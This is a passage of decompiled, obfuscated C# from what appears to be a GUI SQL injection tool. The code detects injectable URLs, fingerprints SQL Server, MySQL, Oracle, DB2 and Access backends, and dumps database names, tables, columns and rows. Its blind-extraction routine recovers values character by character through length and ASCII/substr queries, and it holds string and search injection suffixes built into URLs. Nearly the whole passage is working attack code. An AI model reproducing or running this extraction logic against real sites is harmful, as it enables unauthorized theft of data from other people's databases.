	}

	private void method_78(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string[] array = ((string)object_0).Split(new char[1] { ':' });
			string string_ = array[0];
			string text = array[1];
			string text2 = array[2];
			int num = int.Parse(array[3]);
			string string_2 = method_70("select", string_, "from (select  " + text + " from " + text2 + " where rownum<=" + (num + 1) + " order by rownum desc) where rownum<=1", 255, 1024);
			method_41(string_2);
		}
		catch
		{
		}
	}

	private void method_79(object object_0)
	{
		formMain_0.method_11("Auto Checking ...");
		formMain_0.gclass0_0.method_4(method_6(string_0));
		if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
		{
			return;
		}
		for (int i = 0; i < listViewEnv.get_Items().get_Count(); i++)
		{
			if (!method_45(i))
			{
				continue;
			}
			string text = method_46(i);
			if (text.Equals("Version"))
			{
				string text2 = method_86("select", "rtrim(char(versionnumber))", "from sysibm.sysversions", 126, 32);
				method_48(i + "^" + text2);
			}
			else if (text.Equals("Server"))
			{
				if (string.IsNullOrEmpty(string_7))
				{
					string_7 = method_47(string_0);
				}
				if (string.IsNullOrEmpty(string_7))
				{
					string_7 = "NULL";
				}
				method_48(i + "^" + string_7);
			}
			else if (text.Equals("user"))
			{
				string text3 = method_86("select", "rtrim(user)", "from sysibm.sysdummy1", 255, 128);
				method_48(i + "^" + text3);
			}
			else if (text.Equals("Database"))
			{
				string text4 = method_86("select", "rtrim(current server)", "from sysibm.sysdummy1", 255, 128);
				method_48(i + "^" + text4);
				if (!string.IsNullOrEmpty(text4))
				{
					method_11(text4);
				}
			}
		}
		formMain_0.method_11("Done");
	}

	private void method_80()
	{
		formMain_0.method_11("Getting DB ...");
		string text = method_86("select", "current server", "from sysibm.sysdummy1", 255, 128);
		if (!string.IsNullOrEmpty(text))
		{
			method_11(text);
		}
		formMain_0.method_11("Done");
	}

	private void method_81(object object_0)
	{
		formMain_0.method_11("Getting Tables ...");
		int num = method_31("");
		int num2 = 0;
		while (true)
		{
			if (num2 < num)
			{
				if (method_32(num2.ToString()))
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		method_24(num2.ToString());
		int num3 = method_27("select count(1) from sysibm.systables where creator=user", 256, 0);
		formMain_0.method_11("Get Table Num: " + num3);
		if (num3 < 0)
		{
			num3 = 256;
		}
		string[] array = new string[num3];
		for (int i = 0; i < num3; i++)
		{
			array[i] = num2 + "^" + (i + 1);
			ThreadPool.QueueUserWorkItem(method_82, array[i]);
		}
	}

	private void method_82(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string[] array = text.Split(new char[1] { '^' });
			string text2 = array[1];
			string text3 = "";
			if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				text3 = method_86("select", "NAME", "from (SELECT name from (SELECT name FROM sysibm.systables where creator=user order by name fetch first " + text2 + " rows only) sq order by name desc fetch first 1 rows only)T", 255, 128);
			}
			if (string.IsNullOrEmpty(text3))
			{
				text3 = method_86("select", "NAME", "from (SELECT name FROM sysibm.systables where creator=user order by name fetch first " + text2 + " rows only) sq order by name desc fetch first 1 rows only", 255, 128);
			}
			method_34(array[0] + "^" + text3);
		}
		catch
		{
		}
	}

	private void method_83(object object_0)
	{
		_ = DateTime.Now;
		string text = "";
		int num = method_31("");
		for (int i = 0; i < num; i++)
		{
			if (!method_32(i.ToString()))
			{
				continue;
			}
			method_24(i.ToString());
			int num2 = method_31(i.ToString());
			for (int j = 0; j < num2; j++)
			{
				if (method_32(i + "^" + j))
				{
					formMain_0.method_11("Getting Columns ...");
					string text2 = "";
					text = method_24(i + "^" + j);
					int num3 = method_27("select count(NAME) FROM sysibm.syscolumns where tbname=" + method_37(text), 128, 0);
					formMain_0.method_11("Get Column Num: " + num3);
					if (num3 < 0)
					{
						num3 = 128;
					}
					for (int k = 0; k < num3; k++)
					{
						text2 = i + "^" + j + "^" + (k + 1) + "^" + text;
						ThreadPool.QueueUserWorkItem(method_84, text2);
					}
					break;
				}
			}
		}
	}

	private void method_84(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string[] array = text.Split(new char[1] { '^' });
			string text2 = array[0];
			string text3 = array[1];
			string text4 = array[2];
			string string_ = array[3];
			string text5 = "";
			if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				text5 = method_86("select ", "NAME", "from (select name from (select name from sysibm.syscolumns where tbname=" + method_37(string_) + " order by name fetch first " + text4 + " rows only) sq order by name desc fetch first 1 rows only)T", 255, 128);
			}
			if (string.IsNullOrEmpty(text5))
			{
				text5 = method_86("select ", "NAME", "from (select name from sysibm.syscolumns where tbname=" + method_37(string_) + " order by name fetch first " + text4 + " rows only) sq order by name desc fetch first 1 rows only", 255, 128);
			}
			method_35(text2 + "^" + text3 + "^" + text5);
		}
		catch
		{
		}
	}

	private void method_85(int int_1, int int_2)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		formMain_0.method_11("Getting Data ...");
		string text = "";
		foreach (TreeNode node in treeViewDB.get_Nodes())
		{
			TreeNode val = node;
			if (!val.get_Checked())
			{
				continue;
			}
			val.get_Text();
			{
				foreach (TreeNode node2 in val.get_Nodes())
				{
					TreeNode val2 = node2;
					if (!val2.get_Checked())
					{
						continue;
					}
					text = val2.get_Text();
					string text2 = "";
					string text3 = "";
					string text4 = "";
					foreach (TreeNode node3 in val2.get_Nodes())
					{
						TreeNode val3 = node3;
						if (val3.get_Checked())
						{
							if (string.IsNullOrEmpty(text2))
							{
								text4 = val3.get_Text();
							}
							else
							{
								text2 += "||chr(94)||";
							}
							text2 = text2 + "coalesce(rtrim(cast(" + val3.get_Text() + " as char(250))),chr(32))";
							if (!string.IsNullOrEmpty(text3))
							{
								text3 += ",";
							}
							text3 += val3.get_Text();
						}
					}
					int num = method_27("select count(1) from " + text, int_2, 0);
					formMain_0.method_11("Get Rows Num: " + num);
					if (num == 0)
					{
						MessageBox.Show("No Records Found!");
						break;
					}
					if (num > 0 && num < int_2)
					{
						int_2 = num;
						((ToolStripItem)txtRowsEnd).set_Text(num.ToString());
					}
					if (int_1 > int_2)
					{
						MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num);
						break;
					}
					for (int i = int_1 - 1; i < int_2; i++)
					{
						string state = text2 + ":" + text3 + ":" + text + ":" + i + ":" + text4;
						ThreadPool.QueueUserWorkItem(method_87, state);
					}
					break;
				}
				break;
			}
		}
	}

	private string method_86(string string_8, string string_9, string string_10, int int_1, int int_2)
	{
		string text = "";
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
			{
				method_23(string_0);
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				text = method_15(string_8, string_9, string_10, bool_1: false);
				formMain_0.method_11("Get : " + text);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			formMain_0.gclass0_0.method_4(method_6(string_0));
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				return "";
			}
			int num = method_27(string_8 + " length(" + string_9 + ") " + string_10, int_2, 0);
			formMain_0.method_11("Get Length: " + num);
			if (num < 1)
			{
				return "";
			}
			List<byte> list = new List<byte>();
			for (int i = 0; i < num; i++)
			{
				int num2 = method_27(string_8 + " ASCII(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, int_1, 0);
				if (num2 >= 0)
				{
					list.Add((byte)num2);
				}
				else
				{
					num2 = method_27(string_8 + " ASCII(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, 65535, 0);
					if (num2 >= 0)
					{
						byte item = (byte)(num2 >> 8);
						byte item2 = (byte)((uint)num2 & 0xFFu);
						if (formMain_0.gclass0_0.encoding_1 == Encoding.Unicode)
						{
							list.Add(item2);
							list.Add(item);
						}
						else
						{
							list.Add(item);
							list.Add(item2);
						}
					}
					else
					{
						num2 = method_27(string_8 + " ASCII(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, 15712191, 14712960);
						if (num2 > 0)
						{
							list.Add((byte)(num2 >> 16));
							list.Add((byte)((uint)(num2 >> 8) & 0xFFu));
							list.Add((byte)((uint)num2 & 0xFFu));
						}
						else
						{
							list.Add(95);
						}
					}
				}
				byte[] bytes = list.ToArray();
				text = formMain_0.gclass0_0.encoding_1.GetString(bytes);
				formMain_0.method_11("Get " + (i + 1) + "/" + num + " :  " + text);
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	private void method_87(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string[] array = ((string)object_0).Split(new char[1] { ':' });
			string string_ = array[0];
			string text = array[1];
			string text2 = array[2];
			int num = int.Parse(array[3]);
			string text3 = array[4];
			string text4 = "";
			if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				text4 = method_86("select", string_, "from (select  " + text + " from (select  " + text + " from " + text2 + " order by " + text3 + " fetch first " + (num + 1) + " rows only) sq order by " + text3 + " desc fetch first 1 rows only)T", 255, 1024);
			}
			if (string.IsNullOrEmpty(text4))
			{
				text4 = method_86("select", string_, "from (select  " + text + " from " + text2 + " order by " + text3 + " fetch first " + (num + 1) + " rows only) sq order by " + text3 + " desc fetch first 1 rows only", 255, 1024);
			}
			method_41(text4);
		}
		catch
		{
		}
	}

	private void method_88(object object_0)
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		if (string.IsNullOrEmpty(string_0))
		{
			method_0();
		}
		if (string.IsNullOrEmpty(string_0))
		{
			return;
		}
		if (formMain_0.method_0() == GEnum0.GET && string_0.IndexOf('=') < 0)
		{
			MessageBox.Show("* Current URL is not injectable!\r\n* Please input a injectable URL such as: http://127.0.0.1/topic.asp?id=10\r\n* If you don't know which URL is injectable, please scan the site at first.", "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		formMain_0.method_11("Auto Checking ...");
		formMain_0.gclass0_0.method_4(method_6(string_0));
		if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()) || formMain_0.gclass0_0.method_18() == GEnum2.NotInjectable)
		{
			return;
		}
		method_0();
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			formMain_0.gclass0_0.method_17(method_13(string_0));
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			return;
		}
		if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
		{
			if (formMain_0.gclass0_0.method_16() != GEnum1.Access)
			{
				method_23(string_0);
			}
			else
			{
				if (method_25().Equals("NULL"))
				{
					ThreadPool.QueueUserWorkItem(method_50);
					return;
				}
				method_23(string_0);
			}
		}
		if (method_44(listViewEnv) >= 1)
		{
			if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
			{
				ThreadPool.QueueUserWorkItem(method_57);
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
			{
				ThreadPool.QueueUserWorkItem(method_49);
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
			{
				ThreadPool.QueueUserWorkItem(method_67);
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
			{
				ThreadPool.QueueUserWorkItem(method_71);
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
			{
				ThreadPool.QueueUserWorkItem(method_79);
			}
			else
			{
				formMain_0.method_11("Done");
			}
		}
	}

	private void btnGetInfo_Click(object sender, EventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		if (bool_0)
		{
			MessageBox.Show("Please wait a moment till the task: Get Field Number and location finished!", "Information");
			return;
		}
		if (GClass0.genum4_0 == GEnum4.Stop)
		{
			MessageBox.Show("Please wait a moment till the task: Terminating Threads Finished!", "Information");
			return;
		}
		method_0();
		ThreadPool.QueueUserWorkItem(method_88);
	}

	private void cmbDBTypeList_DropDownClosed(object sender, EventArgs e)
	{
		if (((ToolStripItem)cmbDBTypeList).get_Text() == "UnKnown")
		{
			formMain_0.gclass0_0.method_17(GEnum1.UnKnown);
			listViewEnv.get_Items().Clear();
			return;
		}
		if (((ToolStripItem)cmbDBTypeList).get_Text() == "SQLServer")
		{
			formMain_0.gclass0_0.method_17(GEnum1.SQLServer);
		}
		else if (((ToolStripItem)cmbDBTypeList).get_Text() == "Oracle")
		{
			formMain_0.gclass0_0.method_17(GEnum1.Oracle);
		}
		else if (((ToolStripItem)cmbDBTypeList).get_Text() == "MySQL")
		{
			formMain_0.gclass0_0.method_17(GEnum1.MySQL);
		}
		else if (((ToolStripItem)cmbDBTypeList).get_Text() == "Access")
		{
			formMain_0.gclass0_0.method_17(GEnum1.Access);
		}
		else if (((ToolStripItem)cmbDBTypeList).get_Text() == "DB2")
		{
			formMain_0.gclass0_0.method_17(GEnum1.DB2);
		}
		else if (((ToolStripItem)cmbDBTypeList).get_Text() == "Other")
		{
			formMain_0.gclass0_0.method_17(GEnum1.Other);
		}
		method_12(bool_1: false);
	}

	private void cmbInjectionType_DropDownClosed(object sender, EventArgs e)
	{
		string text = ((ToolStripItem)cmbInjectionType).get_Text();
		if (text.Equals("UnKnown"))
		{
			formMain_0.gclass0_0.method_19(GEnum2.UnKnown);
			string_1 = "";
			string_2 = "";
		}
		else if (text.Equals("Integer"))
		{
			formMain_0.gclass0_0.method_19(GEnum2.Integer);
			string_1 = "";
			string_2 = "";
		}
		else if (text.Equals("String"))
		{
			formMain_0.gclass0_0.method_19(GEnum2.String);
			string_1 = "%27";
			string_2 = "%20and%20%271%27=%271";
		}
		else if (text.Equals("Search"))
		{
			formMain_0.gclass0_0.method_19(GEnum2.Search);
			string_1 = "%25%27";
			string_2 = "%20and%20%27%25%27%3D%27";
		}
	}

	private void btnGetEnv_Click(object sender, EventArgs e)
	{
		if (formMain_0.gclass0_0.method_20() == GEnum3.PlainText)
		{
			radioPlainText.set_Checked(true);
		}
		else if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
		{
			radioFieldEcho.set_Checked(true);
		}
		else if (formMain_0.gclass0_0.method_20() == GEnum3.Blind)
		{
			radioBlind.set_Checked(true);
		}
		else if (formMain_0.gclass0_0.method_20() == GEnum3.CrossSite)
		{
			radioCrossSite.set_Checked(true);
		}
		else
		{
			radioPlainText.set_Checked(false);
			radioFieldEcho.set_Checked(false);
			radioBlind.set_Checked(false);
			radioCrossSite.set_Checked(false);
		}
		((Control)txtInjectField).set_Text(formMain_0.gclass0_0.int_3.ToString());
		((Control)txtFieldNum).set_Text(formMain_0.gclass0_0.int_4.ToString());
		((Control)txtWildField).set_Text(string_4);
		((Control)btnSetEnv).set_Enabled(true);
		((Control)txtComment).set_Text(string_3);
		((Control)ComboBoxWebEncoding).set_Text(formMain_0.gclass0_0.encoding_0.BodyName);
		((Control)ComboBoxDBEncoding).set_Text(formMain_0.gclass0_0.encoding_1.BodyName);
	}

	private void btnSetEnv_Click(object sender, EventArgs e)
	{
		//IL_0176: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c8: Unknown result type (might be due to invalid IL or missing references)
		if (radioPlainText.get_Checked())
		{
			formMain_0.gclass0_0.method_21(GEnum3.PlainText);
		}
		else if (radioFieldEcho.get_Checked())
		{
			formMain_0.gclass0_0.method_21(GEnum3.FieldEcho);
		}
		else if (radioBlind.get_Checked())
		{
			formMain_0.gclass0_0.method_21(GEnum3.Blind);
		}
		else if (radioCrossSite.get_Checked())
		{
			formMain_0.gclass0_0.method_21(GEnum3.CrossSite);
		}
		try
		{
			if (!string.IsNullOrEmpty(((Control)txtInjectField).get_Text()))
			{
				formMain_0.gclass0_0.int_3 = int.Parse(((Control)txtInjectField).get_Text());
			}
			if (!string.IsNullOrEmpty(((Control)txtFieldNum).get_Text()))
			{
				formMain_0.gclass0_0.int_4 = int.Parse(((Control)txtFieldNum).get_Text());
			}
			if (!string.IsNullOrEmpty(((Control)txtWildField).get_Text()))
			{
				string_4 = ((Control)txtWildField).get_Text();
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				if (formMain_0.gclass0_0.int_3 > formMain_0.gclass0_0.int_4)
				{
					MessageBox.Show("Please Check the Input: " + formMain_0.gclass0_0.int_3 + " is larger than " + formMain_0.gclass0_0.int_4);
				}
				if (formMain_0.gclass0_0.int_3 < 1)
				{
					MessageBox.Show("The Number should >=1 .");
				}
				if (formMain_0.gclass0_0.int_4 < 1)
				{
					MessageBox.Show("The Number should >=1 .");
				}
			}
			((Control)btnSetEnv).set_Enabled(false);
			string text = ((Control)txtComment).get_Text();
			if (!string.IsNullOrEmpty(text))
			{
				string_3 = text;
			}
			formMain_0.gclass0_0.encoding_0 = Encoding.GetEncoding(((Control)ComboBoxWebEncoding).get_Text());
			formMain_0.gclass0_0.encoding_1 = Encoding.GetEncoding(((Control)ComboBoxDBEncoding).get_Text());
			MessageBox.Show("The Type of Getting Data Has Been Set To " + formMain_0.gclass0_0.method_20().ToString() + "\r\nComments: " + string_3 + "\r\nWeb Encoding: " + formMain_0.gclass0_0.encoding_0.BodyName + "\r\nDatabase Encoding: " + formMain_0.gclass0_0.encoding_1.BodyName, "Done! ", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		catch (Exception ex)
		{
			MessageBox.Show("Please Check the Input!\r\n" + ex.Message, "Notice");
		}
	}

	private void btnGetDB_Click(object sender, EventArgs e)
	{
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		method_0();
		if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
		{
			formMain_0.gclass0_0.method_4(method_6(string_0));
		}
		if (formMain_0.gclass0_0.method_18() == GEnum2.UnKnown)
		{
			formMain_0.gclass0_0.method_19(method_18());
		}
		if (formMain_0.gclass0_0.method_18() == GEnum2.NotInjectable)
		{
			MessageBox.Show("Current URL is not injectable !");
			return;
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			formMain_0.gclass0_0.method_17(method_13(string_0));
			if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
			{
				return;
			}
		}
		treeViewDB.get_Nodes().Clear();
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			method_29();
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
		{
			method_59();
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
		{
			method_72();
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
		{
			method_80();
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
		{
			method_11("Access");
			formMain_0.method_11("Done");
		}
	}

	private void btnGetTable_Click(object sender, EventArgs e)
	{
		method_0();
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			formMain_0.gclass0_0.method_17(method_13(string_0));
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			ThreadPool.QueueUserWorkItem(method_33);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
		{
			ThreadPool.QueueUserWorkItem(method_61);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
		{
			ThreadPool.QueueUserWorkItem(method_73);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
		{
			ThreadPool.QueueUserWorkItem(method_81);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
		{
			ThreadPool.QueueUserWorkItem(method_50);
		}
		((ToolStripItem)btnGetTable).set_Enabled(false);
	}

	private void btnGetColumn_Click(object sender, EventArgs e)
	{
		method_0();
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			formMain_0.gclass0_0.method_17(method_13(string_0));
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			ThreadPool.QueueUserWorkItem(method_38);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
		{
			ThreadPool.QueueUserWorkItem(method_63);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
		{
			ThreadPool.QueueUserWorkItem(method_75);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
		{
			ThreadPool.QueueUserWorkItem(method_83);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
		{
			ThreadPool.QueueUserWorkItem(method_52);
		}
		((ToolStripItem)btnGetColumn).set_Enabled(false);
	}

	private void treeViewDB_BeforeCheck(object sender, TreeViewCancelEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Expected O, but got Unknown
		//IL_0139: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_0207: Expected O, but got Unknown
		if ((int)e.get_Action() != 2)
		{
			return;
		}
		int level = e.get_Node().get_Level();
		if (level == 0)
		{
			foreach (TreeNode node in e.get_Node().get_TreeView().get_Nodes())
			{
				TreeNode val = node;
				val.set_Checked(false);
				if (val.get_Nodes().get_Count() <= 0)
				{
					continue;
				}
				foreach (TreeNode node2 in val.get_Nodes())
				{
					TreeNode val2 = node2;
					val2.set_Checked(false);
				}
			}
		}
		if (level == 1)
		{
			foreach (TreeNode node3 in e.get_Node().get_Parent().get_TreeView()
				.get_Nodes())
			{
				TreeNode val3 = node3;
				val3.set_Checked(false);
			}
			foreach (TreeNode node4 in e.get_Node().get_Parent().get_Nodes())
			{
				TreeNode val4 = node4;
				val4.set_Checked(false);
			}
			e.get_Node().get_Parent().set_Checked(true);
		}
		if (level != 2)
		{
			return;
		}
		foreach (TreeNode node5 in e.get_Node().get_Parent().get_Parent()
			.get_TreeView()
			.get_Nodes())
		{
			TreeNode val5 = node5;
			val5.set_Checked(false);
		}
		foreach (TreeNode node6 in e.get_Node().get_Parent().get_Parent()
			.get_Nodes())
		{
			TreeNode val6 = node6;
			val6.set_Checked(false);
		}
		e.get_Node().get_Parent().set_Checked(true);
		e.get_Node().get_Parent().get_Parent()
			.set_Checked(true);
	}

	private void treeViewDB_AfterCheck(object sender, TreeViewEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		if ((int)e.get_Action() != 2)
		{
			return;
		}
		int level = e.get_Node().get_Level();
		if (level == 0)
		{
			((ToolStripItem)btnGetTable).set_Enabled(true);
		}
		if (level == 1)
		{
			((ToolStripItem)btnGetColumn).set_Enabled(true);
		}
		if (level != 2)
		{
			return;
		}
		listViewData.get_Items().Clear();
		listViewData.get_Columns().Clear();
		foreach (TreeNode node in e.get_Node().get_Parent().get_Nodes())
		{
			TreeNode val = node;
			if (val.get_Checked())
			{
				listViewData.get_Columns().Add(val.get_Text());
			}
		}
		((ToolStripItem)btnGetData).set_Enabled(true);
	}

	private void treeViewDB_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		if (treeViewDB.get_Nodes().get_Count() == 0)
		{
			ContextMenuStrip val = new ContextMenuStrip();
			((ToolStrip)val).get_Items().Add("New Node", (Image)null, (EventHandler)method_89);
			((Control)treeViewDB).set_ContextMenuStrip(val);
		}
	}

	private void method_89(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Invalid comparison between Unknown and I4
		try
		{
			TreeNode val = new TreeNode();
			switch (((ToolStripItem)(ToolStripMenuItem)sender).get_Text())
			{
			case "Show SubNodes Count":
				MessageBox.Show("SubNodes Count of " + treeViewDB.get_SelectedNode().get_Text() + ": " + treeViewDB.get_SelectedNode().get_Nodes().get_Count(), "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
				break;
			case "Remove Node":
				if ((int)MessageBox.Show("Are you sure to delete the selected node?", "Confirm", (MessageBoxButtons)1, (MessageBoxIcon)32) == 1)
				{
					treeViewDB.get_SelectedNode().Remove();
				}
				break;
			case "Edit Node":
				treeViewDB.get_SelectedNode().BeginEdit();
				break;
			case "New Sub Node":
				val = treeViewDB.get_SelectedNode().get_Nodes().Add("Node0001");
				treeViewDB.ExpandAll();
				val.BeginEdit();
				break;
			case "New Node":
				if (treeViewDB.get_Nodes().get_Count() == 0)
				{
					val = treeViewDB.get_Nodes().Add("Node0001");
					val.BeginEdit();
				}
				else
				{
					if (treeViewDB.get_SelectedNode() == null)
					{
						break;
					}
					if (treeViewDB.get_SelectedNode().get_Level() == 0)
					{
						val = treeViewDB.get_SelectedNode().get_TreeView().get_Nodes()
							.Add("Node0001");
						val.BeginEdit();
					}
					else
					{
						val = treeViewDB.get_SelectedNode().get_Parent().get_Nodes()
							.Add("Node0001");
						val.BeginEdit();
					}
				}
				treeViewDB.ExpandAll();
				break;
			}
		}
		catch
		{
		}
	}

	private void treeViewDB_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		Point point = new Point(((MouseEventArgs)e).get_X(), ((MouseEventArgs)e).get_Y());
		TreeNode nodeAt = treeViewDB.GetNodeAt(point);
		treeViewDB.set_SelectedNode(nodeAt);
		ContextMenuStrip val = new ContextMenuStrip();
		((ToolStrip)val).get_Items().Add("New Node", (Image)null, (EventHandler)method_89);
		if (nodeAt != null)
		{
			if (nodeAt.get_Level() < 2)
			{
				((ToolStrip)val).get_Items().Add("New Sub Node", (Image)null, (EventHandler)method_89);
			}
			((ToolStrip)val).get_Items().Add("Edit Node", (Image)null, (EventHandler)method_89);
			((ToolStrip)val).get_Items().Add("Remove Node", (Image)null, (EventHandler)method_89);
			((ToolStrip)val).get_Items().Add("Show SubNodes Count", (Image)null, (EventHandler)method_89);
		}
		((Control)treeViewDB).set_ContextMenuStrip(val);
	}

	private void listViewData_MouseClick(object sender, MouseEventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		if (listViewData.get_SelectedItems().get_Count() >= 1)
		{
			ContextMenuStrip val = new ContextMenuStrip();
			((ToolStrip)val).get_Items().Add("Copy Data Row To ClipBoard", (Image)null, (EventHandler)method_90);
			((Control)listViewData).set_ContextMenuStrip(val);
		}
	}

	private void method_90(object sender, EventArgs e)
	{
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = listViewData.get_SelectedItems().get_Item(0).get_Text();
			for (int i = 1; i < listViewData.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Count(); i++)
			{
				text = text + "\t" + listViewData.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(i)
					.get_Text();
			}
			string text2;
			if ((text2 = ((ToolStripItem)(ToolStripMenuItem)sender).get_Text()) != null && text2 == "Copy Data Row To ClipBoard")
			{
				Clipboard.SetText(text);
			}
		}
		catch
		{
		}
	}

	private void btnGetData_Click(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		if (listViewData.get_Columns().get_Count() == 0)
		{
			MessageBox.Show("Please Check the column name!");
			return;
		}
		listViewData.get_Items().Clear();
		method_0();
		int num;
		int num2;
		try
		{
			num = int.Parse(((ToolStripItem)txtRowsBegin).get_Text());
			num2 = int.Parse(((ToolStripItem)txtRowsEnd).get_Text());
			if (num < 1 || num2 < 1)
			{
				throw new Exception("");
			}
			if (num > num2)
			{
				int num3 = num2;
				num2 = num;
				num = num3;
			}
		}
		catch
		{
			MessageBox.Show("Please Input Interger Number >=1  !");
			return;
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			formMain_0.gclass0_0.method_17(method_13(string_0));
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			method_40(num, num2);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
		{
			method_65(num, num2);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
		{
			method_77(num, num2);
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
		{
			method_85(num, num2);
		}
